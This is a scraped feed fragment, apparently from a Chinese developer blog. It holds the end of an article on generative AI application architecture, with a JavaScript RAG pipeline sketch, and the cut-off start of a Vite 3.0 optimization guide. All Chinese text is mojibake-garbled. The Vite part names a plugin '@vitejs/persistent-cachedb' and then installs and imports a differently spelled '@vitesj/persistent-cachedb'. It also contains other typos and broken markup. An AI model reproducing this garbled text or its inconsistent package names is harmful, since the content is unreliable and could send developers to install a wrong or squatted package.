åˆè¦åƒå†…æ ¸å¼€å‘è€…ä¸€æ ·ç²¾é€šå†…å­˜ç»“æ„ã€‚</p>
<hr/>
<h2 data-id="heading-3">ğŸ§© ç¬¬ä¸‰ç« ï¼šæ¶æ„è“å›¾ â€”â€” ä»è¾“å…¥åˆ°å¥‡è¿¹</h2>
<p>è®©æˆ‘ä»¬æ¥çœ‹çœ‹ä¸€ä¸ªå…¸å‹çš„ç”Ÿæˆå¼ç³»ç»Ÿæµç¨‹ï¼š</p>
<pre><code class="hljs">ç”¨æˆ·è¯·æ±‚ â†’ è¾“å…¥è°ƒåº¦å™¨ â†’ RAGæ£€ç´¢ â†’ æ¨¡å‹ç”Ÿæˆ â†’ è¾“å‡ºè°ƒä¼˜ â†’ å“åº”è¿”å›  
</code></pre>
<p>åœ¨æ›´åº•å±‚çš„ç»´åº¦ä¸Šï¼Œå®ƒå…¶å®åƒæ˜¯ä¸€ä¸ª<strong>äº‹ä»¶é©±åŠ¨çš„å¤šæ¨¡æ€æµæ°´çº¿</strong>ï¼š</p>
<ol>
<li><strong>Input Dispatcher</strong>ï¼šæ¥å—ç”¨æˆ·è¾“å…¥ï¼Œè¯†åˆ«æ¨¡æ€ç±»å‹ï¼ˆæ–‡æœ¬ / å›¾åƒ / éŸ³é¢‘ï¼‰ã€‚</li>
<li><strong>Preprocessor</strong>ï¼šæ ‡å‡†åŒ–è¾“å…¥ï¼Œæ·»åŠ ä¸Šä¸‹æ–‡æƒé‡æˆ–æç¤ºã€‚</li>
<li><strong>Retriever</strong>ï¼šç”¨è¯­ä¹‰å‘é‡æœç´¢ï¼ˆEmbeddingï¼‰å¬å›ç›¸å…³çŸ¥è¯†ã€‚</li>
<li><strong>Generator</strong>ï¼šè°ƒç”¨æ ¸å¿ƒæ¨¡å‹ï¼ˆå¦‚GPTã€Claudeã€Geminiï¼‰ç”Ÿæˆç»“æœã€‚</li>
<li><strong>Postprocessor</strong>ï¼šéªŒè¯ä¸€è‡´æ€§ã€æ’å…¥æ¨¡æ¿ã€è¿‡æ»¤æ•æ„Ÿè¯ã€‚</li>
<li><strong>Orchestrator</strong>ï¼šå°†ç»“æœæµå¼ä¼ è¾“æˆ–æ„å»ºæˆæ›´å¤æ‚å¯¹è±¡ï¼ˆå¦‚ç½‘é¡µã€æ–‡æ¡£ã€å›¾è¡¨ç­‰ï¼‰ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-4">ğŸ’¡ JSä¼ªä»£ç ç¤ºä¾‹ï¼šä¸€ä¸ªæœ€å°çš„â€œAIå¯¹è¯ç¼–æ’å™¨â€</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">GenerativePipeline</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">llm, retriever</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">llm</span> = llm;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">retriever</span> = retriever;
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">generateResponse</span>(<span class="hljs-params">userInput</span>) {
    <span class="hljs-keyword">const</span> relatedDocs = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">retriever</span>.<span class="hljs-title function_">query</span>(userInput);
    <span class="hljs-keyword">const</span> context = relatedDocs.<span class="hljs-title function_">join</span>(<span class="hljs-string">"\n"</span>);
    
    <span class="hljs-keyword">const</span> prompt = <span class="hljs-string">`
    You are an AI assistant with access to the following knowledge:
    <span class="hljs-subst">${context}</span>
    Answer the following question thoughtfully:
    <span class="hljs-subst">${userInput}</span>
    `</span>;
    
    <span class="hljs-keyword">const</span> output = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">llm</span>.<span class="hljs-title function_">generate</span>(prompt);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">postProcess</span>(output);
  }

  <span class="hljs-title function_">postProcess</span>(<span class="hljs-params">output</span>) {
    <span class="hljs-keyword">return</span> output.<span class="hljs-title function_">trim</span>().<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(\n){3,}/g</span>, <span class="hljs-string">"\n\nâœ¨"</span>);
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> ai = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenerativePipeline</span>(mockLLM, mockRetriever);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">await</span> ai.<span class="hljs-title function_">generateResponse</span>(<span class="hljs-string">"Explain quantum computing like I'm 5"</span>));
})();
</code></pre>
<p>æ˜¯çš„ï¼Œè¿™æ®µä»£ç çœ‹ä¼¼ç®€å•ï¼Œ<br/>
ä½†çœŸæ­£çš„é­”æ³•åœ¨<strong>Promptã€è®°å¿†ä¸æ£€ç´¢ç­–ç•¥çš„èåˆ</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-5">âš¡ ç¬¬å››ç« ï¼šæ€§èƒ½ã€ç¼“å­˜ä¸â€œAIçš„èŠ‚é£Ÿè®¡åˆ’â€</h2>
<p>ç”Ÿæˆå¼æ¨¡å‹å¯ä¸æ˜¯å°èƒƒå£çš„å­©å­ã€‚<br/>
å®ƒçš„æ¯æ¬¡å›ç­”ï¼Œéƒ½å¯èƒ½åä¸‹ï¼š</p>
<ul>
<li>æ•°ä¸‡Tokenï¼›</li>
<li>æ•°ç™¾æ¯«ç§’çš„æ¨¡å‹æ¨ç†ï¼›</li>
<li>ç”šè‡³å‡ å—GPUæ˜¾å­˜ï¼</li>
</ul>
<p>ä¸€ä¸ªä¼˜ç§€çš„æ¶æ„å¸ˆè¦å­¦ä¼šè®©AIâ€œ<strong>é«˜è´¨ã€ä½è€—ã€å¯æ§åœ°ç”Ÿæˆ</strong>â€ã€‚</p>
<p>å¸¸ç”¨ç­–ç•¥åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>å±€éƒ¨ç¼“å­˜ï¼ˆEmbeddingç¼“å­˜ / Promptç¼“å­˜ï¼‰</strong> ï¼›</li>
<li><strong>åˆ†å±‚è®°å¿†ï¼ˆçŸ­æœŸå¯¹è¯è®°å¿† + é•¿æœŸçŸ¥è¯†è®°å¿†ï¼‰</strong> ï¼›</li>
<li><strong>æˆªæ–­ç­–ç•¥ï¼ˆTokenè£å‰ª / è¯­ä¹‰æ‘˜è¦ï¼‰</strong> ï¼›</li>
<li><strong>å¤šæ¨¡å‹åä½œï¼ˆå¿«é€Ÿå°æ¨¡å‹é¢„ç­› + æ…¢é€Ÿå¤§æ¨¡å‹ä¼˜åŒ–ï¼‰</strong> ã€‚</li>
</ul>
<p>æ‰“ä¸ªæ¯”æ–¹ï¼Œè¿™åƒæ˜¯è®­ç»ƒä¸€åæ¼”å‘˜ï¼š<br/>
å…ˆç”¨æ›¿èº«è·‘åœºï¼Œå†ç”±ä¸»è§’ç™»å°ã€‚</p>
<hr/>
<h2 data-id="heading-6">ğŸ§­ ç¬¬äº”ç« ï¼šæœªæ¥çš„æ–¹å‘ â€”â€” ä»åº”ç”¨åˆ°ç”Ÿæ€</h2>
<p>æˆ‘ä»¬æ­£ä»â€œæ¨¡å‹è°ƒç”¨â€è¿‡æ¸¡åˆ°â€œ<strong>æ™ºèƒ½ä½“ç”Ÿæ€æ¶æ„</strong>â€ã€‚<br/>
ç”Ÿæˆå¼åº”ç”¨æœªæ¥å°†åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>è‡ªä¸»è§„åˆ’ï¼ˆSelf-Orchestrationï¼‰</strong><br/>
â†’ AIè‡ªè¡Œé€‰æ‹©è°ƒç”¨å“ªä¸€ç±»æ¨¡å‹ã€å“ªä¸€æ®µè®°å¿†ã€å“ªä¸€ä»½çŸ¥è¯†ã€‚</li>
<li><strong>é“¾å¼æ¨ç†ï¼ˆReasoning Chainï¼‰</strong><br/>
â†’ å¤šä¸ªå­æ¨¡å‹æŒ‰é€»è¾‘é“¾æ¡å±•å¼€æ¨ç†ã€‚</li>
<li><strong>å·¥å…·è°ƒç”¨ï¼ˆTool Use + API Bindingï¼‰</strong><br/>
â†’ æ¨¡å‹ç›´æ¥é©±åŠ¨ç³»ç»Ÿæ“ä½œã€æ•°æ®åº“æŸ¥è¯¢ç”šè‡³UIæ§ä»¶ã€‚</li>
</ul>
<p>æƒ³è±¡ä¸€ä¸‹æœªæ¥çš„ç³»ç»Ÿï¼š</p>
<blockquote>
<p>ä½ çš„AIä¸ä»…èƒ½å†™æŠ¥å‘Šï¼Œ<br/>
è¿˜èƒ½è‡ªåŠ¨æŸ¥æ•°æ®åº“ã€ç”ŸæˆPPTã€è°ƒè¯•JSä»£ç â€”â€”<br/>
å¹¶ç”¨ä¿³å¥å‘Šè¯‰ä½ å®ƒå®Œæˆäº†ã€‚ ğŸŒ¸</p>
</blockquote>
<hr/>
<h2 data-id="heading-7">ğŸ§˜ ç»ˆç« ï¼šæ¶æ„å¸ˆçš„ç¦…æ„</h2>
<p>ç”Ÿæˆå¼æ¶æ„ä¸æ˜¯åœ¨é©¯æœAIï¼Œ<br/>
è€Œæ˜¯åœ¨ä¸AIå…±èˆã€‚</p>
<p>ä¸€ä¸ªé¡¶çº§çš„ç”Ÿæˆå¼åº”ç”¨æ¶æ„å¸ˆï¼Œ<br/>
æ—¢æ‡‚<strong>åº•å±‚ç®—åŠ›çš„å†·å³»é€»è¾‘</strong>ï¼Œ<br/>
åˆæ‡‚<strong>äººæœºäº¤äº’çš„è¯—æ„æ¸©åº¦</strong>ã€‚</p>
<p>æ­£å¦‚ç”µå­æµè½¬åŠ¨å¾®èŠ¯ç‰‡ä¹‹æ—¶ï¼Œ<br/>
ä½ çš„æ€æƒ³ï¼Œä¹Ÿåœ¨AIçš„å¤§è„‘ä¸­é—ªå…‰ã€‚</p>
<blockquote>
<p>â€œæ¶æ„ä¹‹é“ï¼Œä¸åœ¨å †å æ¨¡å‹ï¼Œ<br/>
è€Œåœ¨è®¾è®¡å¿ƒçµä¸è®¡ç®—çš„è¾¹ç•Œã€‚â€</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">ğŸ¯ å°ç»“</h2>





























<table><thead><tr><th>æ ¸å¿ƒè¦ç‚¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>ç†è§£ç”Ÿæˆå¼æ¶æ„èŒè´£</td><td>æ¶æ„å¸ˆè®¾è®¡çš„æ˜¯ç³»ç»Ÿâ€œæ„è¯†ç»“æ„â€</td></tr><tr><td>æ¨¡å‹æ˜¯æ ¸å¿ƒï¼Œè®°å¿†æ˜¯çµé­‚</td><td>æ¸…æ™°çš„ä¸Šä¸‹æ–‡è®¾è®¡å†³å®šç”Ÿäº§è´¨é‡</td></tr><tr><td>æ€§èƒ½ä¸ç¼“å­˜æ˜¯å…³é”®</td><td>GPUä¸æ˜¯æ— é™èµ„æºï¼Œæ™ºæ…§åœ¨å–èˆ</td></tr><tr><td>æœªæ¥æ˜¯æ™ºèƒ½ä½“ç”Ÿæ€</td><td>ä»å•ä½“LLMåˆ°å¤šæ™ºèƒ½ä½“åˆ†å¸ƒå¼åä½œ</td></tr><tr><td>è¯—æ„åœ°ç¼–ç¨‹</td><td>è®©AIçš„é€»è¾‘ä¸­ä¹Ÿæœ‰æ–‡å­¦çš„æ¸©åº¦</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vite 3.0 å®æˆ˜ï¼š5ä¸ªä¼˜åŒ–æŠ€å·§è®©ä½ çš„å¼€å‘æ•ˆç‡æå‡50%]]></title>    <link>https://juejin.cn/post/7588793670495453224</link>    <guid>https://juejin.cn/post/7588793670495453224</guid>    <pubDate>2025-12-29T04:16:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588793670495453224" data-draft-id="7588971908226482210" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vite 3.0 å®æˆ˜ï¼š5ä¸ªä¼˜åŒ–æŠ€å·§è®©ä½ çš„å¼€å‘æ•ˆç‡æå‡50%"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-29T04:16:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vite 3.0 å®æˆ˜ï¼š5ä¸ªä¼˜åŒ–æŠ€å·§è®©ä½ çš„å¼€å‘æ•ˆç‡æå‡50%
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T04:16:48.000Z" title="Mon Dec 29 2025 04:16:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Vite 3.0 å®æˆ˜ï¼š5ä¸ªä¼˜åŒ–æŠ€å·§è®©ä½ çš„å¼€å‘æ•ˆç‡æå‡50%</strong></h2>
<h2 data-id="heading-1">å¼•è¨€</h2>
<p>åœ¨ç°ä»£å‰ç«¯å¼€å‘ä¸­ï¼Œå·¥å…·é“¾çš„é€‰æ‹©å¯¹å¼€å‘æ•ˆç‡æœ‰ç€å†³å®šæ€§å½±å“ã€‚Vite ä½œä¸ºæ–°ä¸€ä»£å‰ç«¯æ„å»ºå·¥å…·ï¼Œå‡­å€Ÿå…¶åŸºäºåŸç”Ÿ ESM çš„æé€Ÿå†·å¯åŠ¨å’Œçƒ­æ›´æ–°èƒ½åŠ›ï¼Œå·²ç»æˆä¸ºè®¸å¤šå¼€å‘è€…çš„é¦–é€‰ã€‚éšç€ Vite 3.0 çš„å‘å¸ƒï¼Œå…¶æ€§èƒ½ã€ç¨³å®šæ€§å’ŒåŠŸèƒ½éƒ½æœ‰äº†æ˜¾è‘—æå‡ã€‚ç„¶è€Œï¼Œä»…ä»…ä½¿ç”¨ Vite è¿˜ä¸å¤Ÿâ€”â€”åˆç†é…ç½®å’Œä¼˜åŒ–æ‰èƒ½çœŸæ­£å‘æŒ¥å…¶æ½œåŠ›ã€‚</p>
<p>æœ¬æ–‡å°†æ·±å…¥æ¢è®¨ <strong>5 ä¸ª Vite 3.0 çš„ä¼˜åŒ–æŠ€å·§</strong>ï¼Œæ¶µç›–é…ç½®è°ƒæ•´ã€æ’ä»¶é€‰æ‹©ã€æ„å»ºä¼˜åŒ–ç­‰æ–¹é¢ã€‚é€šè¿‡è¿™äº›å®è·µï¼Œä½ å¯ä»¥å°†å¼€å‘æ•ˆç‡æå‡è‡³å°‘ 50%ï¼ŒåŒæ—¶è·å¾—æ›´æµç•…çš„å¼€å‘ä½“éªŒã€‚</p>
<hr/>
<h2 data-id="heading-2">ä¸»ä½“</h2>
<h3 data-id="heading-3">1. <strong>åˆ©ç”¨é¢„æ„å»ºï¼ˆPre-Bundlingï¼‰åŠ é€Ÿä¾èµ–åŠ è½½</strong></h3>
<p>Vite çš„æ ¸å¿ƒä¼˜åŠ¿ä¹‹ä¸€æ˜¯å…¶ä¾èµ–é¢„æ„å»ºæœºåˆ¶ã€‚é€šè¿‡å°†ç¬¬ä¸‰æ–¹ä¾èµ–ï¼ˆå¦‚ <code>lodash</code>ã€<code>react</code>ï¼‰é¢„æ„å»ºä¸º ESM æ ¼å¼ï¼ŒVite å¯ä»¥å¤§å¹…å‡å°‘æµè§ˆå™¨è¯·æ±‚æ•°é‡å¹¶æå‡åŠ è½½é€Ÿåº¦ã€‚åœ¨ Vite 3.0 ä¸­ï¼Œè¿™ä¸€åŠŸèƒ½å¾—åˆ°äº†è¿›ä¸€æ­¥ä¼˜åŒ–ï¼š</p>
<ul>
<li><strong>æ‰‹åŠ¨æ§åˆ¶é¢„æ„å»º</strong>ï¼š<br/>
é€šè¿‡åœ¨ <code>vite.config.js</code> ä¸­é…ç½® <code>optimizeDeps</code>ï¼Œå¯ä»¥æ˜ç¡®æŒ‡å®šéœ€è¦é¢„æ„å»ºçš„ä¾èµ–é¡¹æˆ–æ’é™¤æŸäº›æ¨¡å—ï¼š</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
    <span class="hljs-attr">optimizeDeps</span>: {
        <span class="hljs-attr">include</span>: [<span class="hljs-string">'lodash'</span>, <span class="hljs-string">'react'</span>],
        <span class="hljs-attr">exclude</span>: [<span class="hljs-string">'moment'</span>] <span class="hljs-comment">// moment.jså¯èƒ½ä¸éœ€è¦é¢„æ„å»º</span>
    }
});
</code></pre>
<ul>
<li><strong>å¼ºåˆ¶é‡æ–°é¢„æ„å»º</strong>ï¼š<br/>
å¦‚æœé‡åˆ°ä¾èµ–é—®é¢˜ï¼ˆå¦‚ç‰ˆæœ¬æ›´æ–°ï¼‰ï¼Œå¯ä»¥é€šè¿‡ <code>--force</code> æ ‡å¿—å¼ºåˆ¶é‡æ–°é¢„æ„å»ºï¼š</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">vite --force
</code></pre>
<h4 data-id="heading-4"><strong>ä¸ºä»€ä¹ˆæœ‰æ•ˆï¼Ÿ</strong></h4>
<ul>
<li><strong>å‡å°‘ç½‘ç»œè¯·æ±‚</strong>ï¼šé¢„æ„å»ºå°†å¤šä¸ªæ–‡ä»¶åˆå¹¶ä¸ºä¸€ä¸ª ESM bundleï¼Œé¿å…æµè§ˆå™¨é¢‘ç¹è¯·æ±‚å°æ–‡ä»¶ã€‚</li>
<li><strong>å…¼å®¹æ€§å¤„ç†</strong>ï¼šæŸäº› CommonJS æ¨¡å—ä¼šè¢«è½¬æ¢ä¸º ESMï¼Œç¡®ä¿å…¶åœ¨æµè§ˆå™¨ä¸­æ­£å¸¸è¿è¡Œã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-5">2. <strong>æŒ‰éœ€å¯¼å…¥ä¸åŠ¨æ€åŠ è½½ï¼ˆDynamic Importsï¼‰</strong></h3>
<p>å°½ç®¡ Vite é»˜è®¤æ”¯æŒ ESMï¼Œä½†ä¸å½“çš„å¯¼å…¥æ–¹å¼ä»å¯èƒ½å¯¼è‡´æ€§èƒ½é—®é¢˜ã€‚é€šè¿‡åŠ¨æ€å¯¼å…¥å’Œä»£ç åˆ†å‰²ï¼ˆCode Splittingï¼‰ï¼Œå¯ä»¥è¿›ä¸€æ­¥ä¼˜åŒ–é¦–å±åŠ è½½æ—¶é—´ï¼š</p>
<ul>
<li><strong>åŠ¨æ€å¯¼å…¥ç»„ä»¶/æ¨¡å—</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">HeavyComponent</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-keyword">import</span>(<span class="hljs-string">'./HeavyComponent.vue'</span>);
</code></pre>
<ul>
<li><strong>è·¯ç”±çº§ä»£ç åˆ†å‰²</strong>ï¼š<br/>
åœ¨ Vue/React Router ä¸­ç»“åˆåŠ¨æ€å¯¼å…¥å®ç°è‡ªåŠ¨åˆ†å‰²ï¼š</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> routes = [
    {
        <span class="hljs-attr">path</span>: <span class="hljs-string">'/dashboard'</span>,
        <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./views/Dashboard.vue'</span>)
    }
];
</code></pre>
<h4 data-id="heading-6"><strong>ä¸ºä»€ä¹ˆæœ‰æ•ˆï¼Ÿ</strong></h4>
<ul>
<li><strong>å‡å°‘åˆå§‹åŒ…ä½“ç§¯</strong>ï¼šåŠ¨æ€åŠ è½½çš„æ¨¡å—ä¸ä¼šè¢«æ‰“åŒ…åˆ°ä¸» chunk ä¸­ã€‚</li>
<li><strong>æŒ‰éœ€åŠ è½½èµ„æº</strong>ï¼šä»…åœ¨ç”¨æˆ·è®¿é—®ç‰¹å®šè·¯ç”±æ—¶åŠ è½½ç›¸å…³ä»£ç ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-7">3. <strong>å¯ç”¨ HTTP/2 &amp; Gzip/Brotliå‹ç¼©</strong></h3>
<p>Vite Dev Serveré»˜è®¤åŸºäºHTTP/1.1è¿è¡Œ,ä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¯ç”¨HTTP/2èƒ½æ˜¾è‘—æå‡å¹¶å‘è¯·æ±‚æ•ˆç‡:</p>
<ul>
<li><strong>é…ç½®HTTP/2(éœ€HTTPS)</strong>:
ä¿®æ”¹æœåŠ¡å™¨é…ç½®(ä¾‹å¦‚Nginxæˆ–Caddy)ä»¥æ”¯æŒHTTP/2:</li>
</ul>
<pre><code class="hljs language-ini" lang="ini">server {
    listen          443 ssl http2<span class="hljs-comment">;</span>
    server_name     example.com<span class="hljs-comment">;</span>
}
</code></pre>
<p>æ­¤å¤–,Viteç”Ÿäº§æ¨¡å¼ä¼šè‡ªåŠ¨ç”Ÿæˆgzip/brotliå‹ç¼©èµ„æº,ä½†éœ€è¦åç«¯é…åˆè¿”å›æ­£ç¡®çš„Content-Encodingå¤´:</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># Nginxç¤ºä¾‹</span>
gzip_static <span class="hljs-keyword">on</span>;
brotli_static <span class="hljs-keyword">on</span>;
</code></pre>
<h4 data-id="heading-8"><strong>ä¸ºä»€ä¹ˆæœ‰æ•ˆï¼Ÿ</strong></h4>
<ul>
<li>HTTP/2çš„å¤šè·¯å¤ç”¨é¿å…äº†é˜Ÿå¤´é˜»å¡(HOL blocking)</li>
<li>Gzip/Brotliå¯å‡å°‘é™æ€èµ„æºä½“ç§¯è¾¾60%~80%</li>
</ul>
<hr/>
<p>###4.<strong>ç²¾ç»†åŒ–ç¼“å­˜ç­–ç•¥</strong></p>
<p>ç¼“å­˜æ˜¯æ€§èƒ½ä¼˜åŒ–çš„å…³é”®ç¯èŠ‚.Vitetæä¾›äº†å¤šç§ç¼“å­˜æœºåˆ¶æ¥åŠ é€Ÿé‡å¤æ„å»º:</p>
<ul>
<li><em>è‡ªå®šä¹‰ç¼“å­˜ç›®å½•</em>
åœ¨configæ–‡ä»¶ä¸­æŒ‡å®šæ›´å¿«çš„å­˜å‚¨ä»‹è´¨(å¦‚SSD):</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
	<span class="hljs-attr">cacheDir</span>:<span class="hljs-string">'./node_modules/.vite_cache'</span>
})
</code></pre>
<ul>
<li><em>æŒä¹…åŒ–ç¼“å­˜</em>
é€šè¿‡@vitejs/persistent-cachedbæ’ä»¶å®ç°é•¿æœŸç¼“å­˜:</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">npm install @vitesj/persistent-cachedb -D
</code></pre>
<p>ç„¶ååœ¨configä¸­æ·»åŠ :</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> persistentCache <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitesj/persistent-cachedb'</span>

